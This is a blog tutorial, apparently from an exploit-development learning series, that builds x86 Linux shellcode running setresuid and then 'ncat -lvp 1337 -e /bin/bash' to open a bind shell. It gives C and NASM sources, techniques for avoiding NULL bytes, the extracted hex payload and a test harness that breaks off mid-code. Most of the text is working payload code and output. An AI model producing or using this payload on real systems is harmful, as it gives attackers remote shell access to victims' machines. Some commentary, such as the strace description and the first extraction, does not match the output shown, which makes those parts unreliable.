<h2 id="how-to-make-your-own-shellcode-part-ii">How to Make Your Own Shellcode Part II!</h2>

<p>Hello Hackers Part two of <code class="language-plaintext highlighter-rouge">"How to Make Your Own Shellcode</code>. Before I start, I’d like to thank him for helping, <a href="https://twitter.com/NytroRST">NytroRST</a>.</p>

<p>Let’s get started! We will use code written in ASM (Assembly Language) to make the shellcode.When we got to machine level, we got the best lines of code. To figure out how to make this bad code, you need to remember what I said in the first part:</p>

<p>Assembly Language x86/x64, a general understanding of C/C++, and an understanding of how the Linux system works.</p>

<p>This time, we’ll make a shellcode that runs the command <code class="language-plaintext highlighter-rouge">/usr/bin/ncat -lvp 1337 -e /bin/bash</code>.</p>

<p>Now, as a computer enthusiast and a developer-in-progress, I was able to document and make my own version of shellcode in about two days. I could say that there are a lot of different shellcodes on the internet, just as newer operating systems don’t allow <code class="language-plaintext highlighter-rouge">nc</code> commands with the <code class="language-plaintext highlighter-rouge">-e</code> argument anymore, so I made a shellcode that lets you use <code class="language-plaintext highlighter-rouge">ncat</code> to access the terminal. Since <code class="language-plaintext highlighter-rouge">ncat</code> is a tool for debugging networks, it is hard to make a shellcode that will run it.</p>

<p>Let’s see what our shellcode does for the first time!!</p>

<p>On your Linux prompt, type <code class="language-plaintext highlighter-rouge">/usr/bin/ncat -lvp1337 -e/bin/bash</code> to open a ncat listener on port 1337. If you don’t have the ncat tool installed, type <code class="language-plaintext highlighter-rouge">sudo apt install nmap</code> instead.</p>

<p><img src="/assets/img/headers/shellcode-part-2/shellcode8.png" alt="shellcode" />
<img src="/assets/img/headers/shellcode-part-2/shellcode9.png" alt="shellcode" /></p>

<h2 id="allocate-in-registry-specific-value-syscall-strings-argument">Allocate in registry specific value (syscall, strings, argument)!</h2>

<p>Before make the program in C language, we must keep in mind that each register must have values specific to each parameter used by the ncat. For Example:</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>EAX <span class="o">=</span> 11 <span class="o">(</span>this value at EAX register represents system call <span class="k">for </span>execve<span class="o">)</span>
EBX <span class="o">=</span> <span class="s2">"/usr/bin/ncat"</span> <span class="o">(</span>char <span class="k">*</span><span class="o">)</span>
ECX <span class="o">=</span> arguments <span class="o">(</span>char <span class="k">**</span><span class="o">)</span>
EDX <span class="o">=</span> <span class="nb">env</span> <span class="o">(</span>char <span class="k">**</span><span class="o">)</span>
ESI contain the Index Source ,specified <span class="k">for </span>strings
</pre></td></tr></tbody></table></code></pre></div></div>
<ul>
  <li>EAX need to containt the syscall number in our case 11.</li>
  <li>EBX need to containt the path and ncat program.</li>
  <li>ECX store all the argument.</li>
  <li>EDX allocate the environment.</li>
  <li>ESI index source.</li>
</ul>

<p>Now that we understand this, we will be able to make our own program in the C computer language.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;"stdio.h"&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;"unistd.h"&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
<span class="kt">char</span> <span class="o">*</span><span class="n">env</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="nb">NULL</span><span class="p">};</span>
<span class="kt">char</span> <span class="o">*</span><span class="n">arguments</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span><span class="o">=</span> <span class="p">{</span> <span class="s">"/usr/bin/ncat"</span><span class="p">,</span>
<span class="s">"-lvp"</span><span class="p">,</span>
<span class="s">"1337"</span><span class="p">,</span>
<span class="s">"-e"</span><span class="p">,</span>
<span class="s">"/bin/bash"</span><span class="p">,</span>
<span class="nb">NULL</span>
<span class="p">};</span>
<span class="n">execve</span><span class="p">(</span><span class="s">"/usr/bin/ncat"</span><span class="p">,</span> <span class="n">arguments</span><span class="p">,</span> <span class="n">env</span><span class="p">);</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<p>We can observ inside the <code class="language-plaintext highlighter-rouge">main()</code>, an array of character pointers <code class="language-plaintext highlighter-rouge">env</code> is declared and initialized with a single <code class="language-plaintext highlighter-rouge">NULL</code> value. This array is used to pass environment variables to the <code class="language-plaintext highlighter-rouge">execve()</code> function.</p>

<p>Another array of character pointers arguments is declared and initialized with command-line arguments to be passed to the execve() function. Here’s a breakdown of the values:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">/usr/bin/ncat</code>: The path to the ncat command-line utility.</li>
  <li><code class="language-plaintext highlighter-rouge">-lvp</code>: Flags/options to be passed to ncat.</li>
  <li><code class="language-plaintext highlighter-rouge">1337</code>: A port number to listen on.</li>
  <li><code class="language-plaintext highlighter-rouge">-e</code>: An option to execute a program.</li>
  <li><code class="language-plaintext highlighter-rouge">/bin/bash</code>: The path to the bash shell.</li>
  <li><code class="language-plaintext highlighter-rouge">NULL</code>: A NULL terminator indicating the end of the arguments array.</li>
</ul>

<p>The <code class="language-plaintext highlighter-rouge">execve()</code> function is called with three arguments:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">/usr/bin/ncat</code>: The path to the executable file to be executed.</li>
  <li><code class="language-plaintext highlighter-rouge">arguments</code>: The array of command-line arguments.</li>
  <li><code class="language-plaintext highlighter-rouge">env</code>: The array of environment variables.</li>
</ul>

<p>Let’s compile the code and execute:</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>gcc <span class="nt">-m32</span> shellcode.c <span class="nt">-o</span> shellcode
</pre></td></tr></tbody></table></code></pre></div></div>
<p><img src="/assets/img/headers/shellcode-part-2/shellcode10.png" alt="shellcode" /></p>

<p>Now we use <code class="language-plaintext highlighter-rouge">strace ./shellcode</code> to see what syscall is executing!!</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre>execve<span class="o">(</span><span class="s2">"./shellcode"</span>, <span class="o">[</span><span class="s2">"./shellcode"</span><span class="o">]</span>, 0x7ffeb39575a0 /<span class="k">*</span> 63 vars <span class="k">*</span>/<span class="o">)</span> <span class="o">=</span> 0
strace: <span class="o">[</span> Process <span class="nv">PID</span><span class="o">=</span>5815 runs <span class="k">in </span>32 bit mode. <span class="o">]</span>
brk<span class="o">(</span>NULL<span class="o">)</span>                               <span class="o">=</span> 0x56e7b000
access<span class="o">(</span><span class="s2">"/etc/ld.so.nohwcap"</span>, F_OK<span class="o">)</span>      <span class="o">=</span> <span class="nt">-1</span> ENOENT <span class="o">(</span>No such file or directory<span class="o">)</span>
mmap2<span class="o">(</span>NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, <span class="nt">-1</span>, 0<span class="o">)</span> <span class="o">=</span> 0xf7fc6000
access<span class="o">(</span><span class="s2">"/etc/ld.so.preload"</span>, R_OK<span class="o">)</span>      <span class="o">=</span> <span class="nt">-1</span> ENOENT <span class="o">(</span>No such file or directory<span class="o">)</span>
openat<span class="o">(</span>AT_FDCWD, <span class="s2">"/etc/ld.so.cache"</span>, O_RDONLY|O_CLOEXEC<span class="o">)</span> <span class="o">=</span> 3
fstat64<span class="o">(</span>3, <span class="o">{</span><span class="nv">st_mode</span><span class="o">=</span>S_IFREG|0644, <span class="nv">st_size</span><span class="o">=</span>108639, ...<span class="o">})</span> <span class="o">=</span> 0
mmap2<span class="o">(</span>NULL, 108639, PROT_READ, MAP_PRIVATE, 3, 0<span class="o">)</span> <span class="o">=</span> 0xf7fab000
close<span class="o">(</span>3<span class="o">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<h2 id="deal-with-null-bytes">Deal with NULL bytes!</h2>
<p>Here we can see the first system call execve executing out program, followed by the opening of the dynamic linker/loader ld.so to load shared libraries, followed by the opening of libc which loads the standard C library, followed by its identification as an ELF file (“\177ELF”), followed by our program being mapped in the memory, and finally our call to exit. So it works.Now let’s try to extract shellcode ,i will use my own tool in python for extract this shellcode!</p>

<p>You can find this tool on my github: <a href="https://github.com/T3jv1l/Sh3llshock">https://github.com/T3jv1l/Sh3llshock</a></p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre>t3jv1l@t3jv1l:~<span class="nv">$ </span>Sh3llshock.py
Usage:  <span class="o">[</span>argument] <span class="o">[</span>file] <span class="o">[</span>argument]:
      <span class="nt">-f</span>    <span class="nt">--file</span>     The Elf x84/x64  file
      <span class="nt">-s</span>    <span class="nt">--show</span>     Show shellcode
      <span class="nt">-i</span>    <span class="nt">--intel</span>    Syntax
 Example: ./Sh3llshock.py <span class="nt">-f</span> <span class="s1">'/home/T3jv1l/Desktop/Python/hello.o'</span> <span class="nt">-s</span>

t3jv1l@t3jv1l:~<span class="nv">$ </span>Sh3llshock.py <span class="nt">-f</span> <span class="s2">"shellcode"</span> <span class="nt">-s</span>
<span class="o">[</span>+] Shellcode <span class="o">=</span>
<span class="se">\x</span>53<span class="se">\x</span>83<span class="se">\x</span>ec<span class="se">\x</span>08<span class="se">\x</span>e8<span class="se">\x</span>bf<span class="se">\x</span>00<span class="se">\x</span>00
<span class="se">\x</span>00<span class="se">\x</span>81<span class="se">\x</span>c3<span class="se">\x</span>0f<span class="se">\x</span>1c<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>8b
<span class="se">\x</span>83<span class="se">\x</span>24<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>85<span class="se">\x</span>c0<span class="se">\x</span>74
<span class="se">\x</span>05<span class="se">\x</span>e8<span class="se">\x</span>62<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>83<span class="se">\x</span>c4
<span class="se">\x</span>08<span class="se">\x</span>5b<span class="se">\x</span>c3
<span class="o">[</span>+] We have a shellcode...
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Now we have our own shellcode, but there’s a problem: it has a NULL BYTES in it.</p>

<p>Null byte is a byte with the value zero \x53\x83\xec\x08\xe8\xbf\ <strong>x00\x00\x00</strong> \x81\xc3\x0f\x1c\ <strong>x00\x00</strong> \x8b\x83\x24\ <strong>x00\x00\x00</strong> \x85\xc0\x74\x05\xe8\x62\ <strong>x00\x00\x00</strong> \x83\xc4\x08\x5b\xc3 . It is in many character sets, such as ISO/IEC 646 (or ASCII), the C0 control code, the Universal Coded Character Set (or Unicode), and EBCDIC. It can be used in almost all popular computer languages. Most of the time, this happens when we try to get shellcode out of a C program.</p>

<p>Even if we try to run this shellcode, the program will stop at the first Null Byte (/x00).</p>

<p>If we look is full of those bits we do not want! In the first part of shellcode you will see that I did not have any problems with those bits</p>

<p>I speak with <a href="https://twitter.com/NytroRST">NytroRST</a> and he said: “To avoid NULL bytes, all you have to do is to replace the instructions in the machine code with contain NULL .For example, to make a 0 register.”. You can do this using the next instruction in assembly language:</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>mov eax, 0
</pre></td></tr></tbody></table></code></pre></div></div>
<p>But this will contain NULL bytes and a void replacing the instruction with</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>xor eax, eax
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Which has the same result,<code class="language-plaintext highlighter-rouge">EAX</code> becomes <code class="language-plaintext highlighter-rouge">0</code>, but there is no <code class="language-plaintext highlighter-rouge">NULL</code> in machine language.Then I remembered that in college I used an XOR method on an electric circuit which can also be applied here.</p>

<p>Although,I tried to run as much as I could from ASM,we need to write in Assembly Language so I can get rid of those NULL. I will put in references,link with cours in Assembly language and i will put a article writen by NytroRST about Shellcode for Windows.</p>

<p>How can we use the method XOR? it’s very easy, I’ll put a little schema to understand.</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>0 XOR 0 <span class="o">=</span> 0
0 XOR 1 <span class="o">=</span> 1
1 XOR 0 <span class="o">=</span> 1
1 XOR 1 <span class="o">=</span> 0
</pre></td></tr></tbody></table></code></pre></div></div>
<p>You need to remember two ideas :</p>
<ul>
  <li>You can’t have NULL in your shellcode!</li>
  <li>XOR is your friend!</li>
</ul>

<h2 id="start-to-build-shellcode">Start To Build Shellcode!</h2>

<p>Now let’s start building our assembly code:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre></td><td class="rouge-code"><pre><span class="n">global</span> <span class="n">_start</span><span class="o">:</span>
  <span class="n">_start</span><span class="o">:</span>
  <span class="n">jmp</span> <span class="kt">short</span> <span class="n">todo</span>

  <span class="n">shellcode</span><span class="o">:</span>

  <span class="n">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>            <span class="p">;</span><span class="n">Zero</span> <span class="n">out</span> <span class="n">eax</span>
  <span class="n">xor</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">ebx</span>            <span class="p">;</span><span class="n">Zero</span> <span class="n">out</span> <span class="n">ebx</span>
  <span class="n">xor</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">ecx</span>            <span class="p">;</span><span class="n">Zero</span> <span class="n">out</span> <span class="n">ecx</span>
  <span class="n">cdq</span>	      		  <span class="p">;</span><span class="n">Zero</span> <span class="n">out</span> <span class="n">edx</span> <span class="n">using</span> <span class="n">the</span> <span class="n">sign</span> <span class="n">bit</span> <span class="n">from</span> <span class="n">eax</span>
  <span class="n">mov</span> <span class="n">BYTE</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0xa4</span>       <span class="p">;</span><span class="n">Setresuid</span> <span class="n">syscall</span> <span class="mi">164</span> <span class="p">(</span><span class="mh">0xa4</span><span class="p">)</span>
  <span class="kt">int</span> <span class="mh">0x80</span>                <span class="p">;</span><span class="n">Syscall</span> <span class="n">execute</span>
  <span class="n">pop</span> <span class="n">esi</span>                 <span class="p">;</span><span class="n">Esi</span> <span class="n">contain</span> <span class="n">the</span> <span class="n">string</span> <span class="n">in</span> <span class="n">db</span>
  <span class="n">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>            <span class="p">;</span><span class="n">Zero</span> <span class="n">out</span> <span class="n">eax</span>
  <span class="n">mov</span><span class="p">[</span><span class="n">esi</span><span class="o">+</span><span class="mi">13</span><span class="p">],</span> <span class="n">al</span>         <span class="p">;</span><span class="n">Null</span> <span class="n">terminate</span> <span class="s">"/usr/bin/ncat"</span>
  <span class="n">mov</span><span class="p">[</span><span class="n">esi</span><span class="o">+</span><span class="mi">22</span><span class="p">],</span> <span class="n">al</span>         <span class="p">;</span><span class="n">Null</span> <span class="n">terminate</span> <span class="s">"-lvp1337"</span>
  <span class="n">mov</span><span class="p">[</span><span class="n">esi</span><span class="o">+</span><span class="mi">34</span><span class="p">],</span> <span class="n">al</span>         <span class="p">;</span><span class="n">Null</span> <span class="n">terminate</span> <span class="s">"-e/bin/bash"</span>
  <span class="n">mov</span><span class="p">[</span><span class="n">esi</span><span class="o">+</span><span class="mi">35</span><span class="p">],</span> <span class="n">esi</span>        <span class="p">;</span><span class="n">Store</span> <span class="n">address</span> <span class="n">of</span> <span class="s">"/usr/bin/ncat"</span> <span class="n">in</span> <span class="n">AAAA</span>
  <span class="n">lea</span> <span class="n">ebx</span><span class="p">,</span> <span class="p">[</span><span class="n">esi</span><span class="o">+</span><span class="mi">14</span><span class="p">]</span>       <span class="p">;</span><span class="n">Load</span> <span class="n">address</span> <span class="n">of</span> <span class="s">"-lvp1337"</span>
  <span class="n">mov</span><span class="p">[</span><span class="n">esi</span><span class="o">+</span><span class="mi">39</span><span class="p">],</span> <span class="n">ebx</span>        <span class="p">;</span><span class="n">Store</span> <span class="n">address</span> <span class="n">of</span> <span class="s">"-lvp1337"</span> <span class="n">in</span> <span class="n">BBBB</span> <span class="n">taken</span> <span class="n">from</span> <span class="n">ebx</span>
  <span class="n">lea</span> <span class="n">ebx</span><span class="p">,</span> <span class="p">[</span><span class="n">esi</span><span class="o">+</span><span class="mi">23</span><span class="p">]</span>       <span class="p">;</span><span class="n">Load</span> <span class="n">address</span> <span class="n">of</span> <span class="s">"-e/bin/bash"</span> <span class="n">into</span> <span class="n">ebx</span>
  <span class="n">mov</span><span class="p">[</span><span class="n">esi</span><span class="o">+</span><span class="mi">43</span><span class="p">],</span> <span class="n">ebx</span>        <span class="p">;</span><span class="n">Store</span> <span class="n">address</span> <span class="n">of</span> <span class="s">"-e/bin/bash"</span> <span class="n">in</span> <span class="n">CCCC</span> <span class="n">taken</span> <span class="n">from</span> <span class="n">ebx</span>
  <span class="n">mov</span><span class="p">[</span><span class="n">esi</span><span class="o">+</span><span class="mi">47</span><span class="p">],</span> <span class="n">eax</span>        <span class="p">;</span><span class="n">Zero</span> <span class="n">out</span> <span class="n">DDDD</span>
  <span class="n">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mi">11</span>              <span class="p">;</span><span class="mi">11</span> <span class="n">is</span> <span class="n">execve</span> <span class="n">syscall</span> <span class="n">number</span>
  <span class="n">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">esi</span>            <span class="p">;</span><span class="n">Store</span> <span class="n">address</span> <span class="n">of</span> <span class="s">"/usr/bin/ncat"</span>
  <span class="n">lea</span> <span class="n">ecx</span><span class="p">,</span> <span class="p">[</span><span class="n">esi</span><span class="o">+</span><span class="mi">35</span><span class="p">]</span>       <span class="p">;</span><span class="n">Load</span> <span class="n">address</span> <span class="n">of</span> <span class="n">ptr</span> <span class="n">to</span> <span class="n">argv</span><span class="p">[]</span> <span class="n">array</span>
  <span class="n">lea</span> <span class="n">edx</span><span class="p">,</span> <span class="p">[</span><span class="n">esi</span><span class="o">+</span><span class="mi">47</span><span class="p">]</span>       <span class="p">;</span><span class="n">envp</span><span class="p">[]</span> <span class="nb">NULL</span>
  <span class="kt">int</span> <span class="mh">0x80</span>                <span class="p">;</span><span class="n">Syscall</span> <span class="n">execute</span>

  <span class="n">todo</span><span class="o">:</span>
  <span class="n">call</span> <span class="n">shellcode</span>
  <span class="n">db</span> <span class="s">"/usr/bin/ncat#-lvp1337#-e/bin/bash#AAAABBBBCCCCDDDD"</span>
  <span class="p">;</span>   <span class="mo">01234567</span><span class="mi">8901234567890123456789012345678901234567890</span>
  <span class="p">;</span><span class="n">We</span> <span class="n">commented</span> <span class="n">down</span> <span class="n">of</span> <span class="n">it</span> <span class="n">number</span> <span class="n">to</span> <span class="n">have</span> <span class="n">a</span> <span class="n">focus</span> <span class="n">on</span> <span class="n">the</span> <span class="n">command</span><span class="p">.</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<p>The shellcode performs a series of instructions to achieve a specific purpose, likely related to privilege escalation or executing arbitrary code. Here’s a breakdown of the instructions:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">xor</code> instructions are used to zero out registers.</li>
  <li><code class="language-plaintext highlighter-rouge">cdq</code> extends the sign bit of <code class="language-plaintext highlighter-rouge">eax</code> into <code class="language-plaintext highlighter-rouge">edx</code>, effectively zeroing out <code class="language-plaintext highlighter-rouge">edx</code>.</li>
  <li><code class="language-plaintext highlighter-rouge">mov BYTE al, 0xa4</code> sets al to <code class="language-plaintext highlighter-rouge">0xa4</code>, which corresponds to the <code class="language-plaintext highlighter-rouge">setresuid</code> system call number.</li>
  <li><code class="language-plaintext highlighter-rouge">int 0x80</code> triggers a software interrupt, invoking the system call.</li>
  <li><code class="language-plaintext highlighter-rouge">pop esi</code> retrieves the value from the top of the stack and stores it in esi. This likely holds the address of the string defined after the <code class="language-plaintext highlighter-rouge">todo</code> label.</li>
  <li><code class="language-plaintext highlighter-rouge">mov [esi+35]</code>, <code class="language-plaintext highlighter-rouge">esi</code> stores the address of <code class="language-plaintext highlighter-rouge">/usr/bin/ncat</code> in the string at position <code class="language-plaintext highlighter-rouge">AAAA</code>.</li>
  <li><code class="language-plaintext highlighter-rouge">lea</code> instructions are used to calculate the addresses of specific portions of the string and store them in registers.</li>
  <li><code class="language-plaintext highlighter-rouge">mov al, 11</code> sets <code class="language-plaintext highlighter-rouge">al</code> to <code class="language-plaintext highlighter-rouge">11</code>, which corresponds to the <code class="language-plaintext highlighter-rouge">execve</code> system call number.</li>
  <li><code class="language-plaintext highlighter-rouge">mov ebx, esi</code> stores the address of <code class="language-plaintext highlighter-rouge">/usr/bin/ncat</code> in ebx.</li>
  <li><code class="language-plaintext highlighter-rouge">lea ecx, [esi+35]</code> loads the address of the pointer to the <code class="language-plaintext highlighter-rouge">argv[]</code> array into <code class="language-plaintext highlighter-rouge">ecx</code>.</li>
  <li><code class="language-plaintext highlighter-rouge">lea edx, [esi+47]</code> loads the address of the <code class="language-plaintext highlighter-rouge">envp[]</code> array (NULL) into <code class="language-plaintext highlighter-rouge">edx</code>.</li>
  <li><code class="language-plaintext highlighter-rouge">int 0x80</code> triggers a software interrupt, invoking the system call.</li>
  <li><code class="language-plaintext highlighter-rouge">todo</code> is a label that marks the start of the todo section.</li>
  <li><code class="language-plaintext highlighter-rouge">call shellcode</code> calls the shellcode procedure, executing the instructions defined earlier.</li>
  <li>The <code class="language-plaintext highlighter-rouge">db</code> directive is used to define a string containing the command <code class="language-plaintext highlighter-rouge">/usr/bin/ncat -lvp1337 -e/bin/bash</code>.</li>
</ul>

<p>Now all we have to do is compile the program and extract that shellcode! Look Part 1 to see how it is compiled!</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>nasm <span class="nt">-f</span> elf32 shellcode.asm <span class="nt">-o</span> shellcode.o
ld <span class="nt">-m</span> elf_i386 <span class="nt">-s</span> <span class="nt">-o</span> shellcode shellcode.o
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Now we use Sh3llshock.py to extract the shellcode! We obtain:</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre>t3jv1l@t3jv1l:~/Desktop/OSCE/Shellcode/test<span class="nv">$ </span>Sh3llshock.py <span class="nt">-f</span> <span class="s2">"shellcode"</span> <span class="nt">-s</span>
  <span class="o">[</span>+] Shellcode <span class="o">=</span>
  <span class="se">\x</span>eb<span class="se">\x</span>35<span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>31<span class="se">\x</span>db<span class="se">\x</span>31<span class="se">\x</span>c9
  <span class="se">\x</span>99<span class="se">\x</span>b0<span class="se">\x</span>a4<span class="se">\x</span><span class="nb">cd</span><span class="se">\x</span>80<span class="se">\x</span>5e<span class="se">\x</span>31<span class="se">\x</span>c0
  <span class="se">\x</span>88<span class="se">\x</span>46<span class="se">\x</span>0d<span class="se">\x</span>88<span class="se">\x</span>46<span class="se">\x</span>16<span class="se">\x</span>88<span class="se">\x</span>46
  <span class="se">\x</span>22<span class="se">\x</span>89<span class="se">\x</span>76<span class="se">\x</span>23<span class="se">\x</span>8d<span class="se">\x</span>5e<span class="se">\x</span>0e<span class="se">\x</span>89
  <span class="se">\x</span>5e<span class="se">\x</span>27<span class="se">\x</span>8d<span class="se">\x</span>5e<span class="se">\x</span>17<span class="se">\x</span>89<span class="se">\x</span>5e<span class="se">\x</span>2b
  <span class="se">\x</span>89<span class="se">\x</span>46<span class="se">\x</span>2f<span class="se">\x</span>b0<span class="se">\x</span>0b<span class="se">\x</span>89<span class="se">\x</span>f3<span class="se">\x</span>8d
  <span class="se">\x</span>4e<span class="se">\x</span>23<span class="se">\x</span>8d<span class="se">\x</span>56<span class="se">\x</span>2f<span class="se">\x</span><span class="nb">cd</span><span class="se">\x</span>80<span class="se">\x</span>e8
  <span class="se">\x</span>c6<span class="se">\x</span>ff<span class="se">\x</span>ff<span class="se">\x</span>ff<span class="se">\x</span>2f<span class="se">\x</span>75<span class="se">\x</span>73<span class="se">\x</span>72
  <span class="se">\x</span>2f<span class="se">\x</span>62<span class="se">\x</span>69<span class="se">\x</span>6e<span class="se">\x</span>2f<span class="se">\x</span>6e<span class="se">\x</span>63<span class="se">\x</span>61
  <span class="se">\x</span>74<span class="se">\x</span>23<span class="se">\x</span>2d<span class="se">\x</span>6c<span class="se">\x</span>76<span class="se">\x</span>70<span class="se">\x</span>31<span class="se">\x</span>33
  <span class="se">\x</span>33<span class="se">\x</span>37<span class="se">\x</span>23<span class="se">\x</span>2d<span class="se">\x</span>65<span class="se">\x</span>2f<span class="se">\x</span>62<span class="se">\x</span>69
  <span class="se">\x</span>6e<span class="se">\x</span>2f<span class="se">\x</span>62<span class="se">\x</span>61<span class="se">\x</span>73<span class="se">\x</span>68<span class="se">\x</span>23<span class="se">\x</span>41
  <span class="se">\x</span>41<span class="se">\x</span>41<span class="se">\x</span>41<span class="se">\x</span>42<span class="se">\x</span>42<span class="se">\x</span>42<span class="se">\x</span>42<span class="se">\x</span>43
  <span class="se">\x</span>43<span class="se">\x</span>43<span class="se">\x</span>43<span class="se">\x</span>44<span class="se">\x</span>44<span class="se">\x</span>44<span class="se">\x</span>44
  <span class="o">[</span>+] We have a shellcode....
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Now it’s time to test this shellcode with C program!</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre></td><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;'stdio.h'&gt;</span><span class="c1">    //IO header</span><span class="cp">
#include</span> <span class="cpf">&lt;'sys/mman.h'&gt;</span><span class="c1"> //MMAN sys func</span><span class="cp">
#include</span> <span class="cpf">&lt;'string.h'&gt;</span><span class="c1">   //Functions on favor of strings</span><span class="cp">
#include</span> <span class="cpf">&lt;'stdlib.h'&gt;</span><span class="c1">   //Define Var types</span><span class="cp">
#include</span> <span class="cpf">&lt;'unistd.h'&gt;</span><span class="c1">   //Defines misc symbolic constants and types, and declares misc functions</span><span class="cp">
</span>
<span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">shellcodetotest</span><span class="p">)();</span>  <span class="cm">/* Global Variable type int, shellcode to test is a function pointer */</span>

<span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\xeb\x35\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x5e\x31\xc0\x88\x46\x0d\x88\x46\x16\x88\x46\x22\x89\x76\x23\x8d\x5e\x0e\x89\x5e\x27\x8d\x5e\x17\x89\x5e\x2b\x89\x46\x2f\xb0\x0b\x89\xf3\x8d\x4e\x23\x8d\x56\x2f\xcd\x80\xe8\xc6\xff\xff\xff\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x6e\x63\x61\x74\x23\x2d\x6c\x76\x70\x31\x33\x33\x37\x23\x2d\x65\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x23</span><span class="s">"</span><span class="p">;</span> <span class="cm">/* Global array */</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
	<span class="kt">void</span> <span class="o">*</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">150</span><span class="p">,</span> <span class="n">PROT_EXEC</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="o">|</span> <span class="n">PROT_READ</span><span class="p">,</span> <span class="n">MAP_ANON</span> <span class="o">|</span> <span class="n">MAP_PRIVATE</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span> <span class="cm">/* Mmap functions passed to *ptr pointer */</span>
	<span class="k">if</span><span class="p">(</span><span class="n">ptr</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">){</span>
		<span class="n">perror</span><span class="p">(</span><span class="s">"mmap"</span><span class="p">);</span>  <span class="cm">/* Func to error of program */</span>
		<span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
